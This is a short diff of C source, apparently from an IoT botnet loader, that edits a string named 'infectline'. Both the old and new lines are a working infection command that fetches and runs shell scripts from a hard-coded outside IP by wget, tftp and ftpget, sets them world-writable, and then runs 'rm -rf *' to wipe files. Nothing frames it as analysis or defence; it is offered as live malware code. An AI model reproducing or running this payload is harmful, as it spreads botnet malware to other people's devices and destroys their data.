@@ -32,7 +32,7 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 
-char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.206.225.136 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.206.225.136; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.206.225.136 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
+char *infectline = "cd /tmp ; wget http://5.206.225.136/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.206.225.136 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.206.225.136; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.206.225.136 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
 
 // WGET LINE GOES HERE ^
 
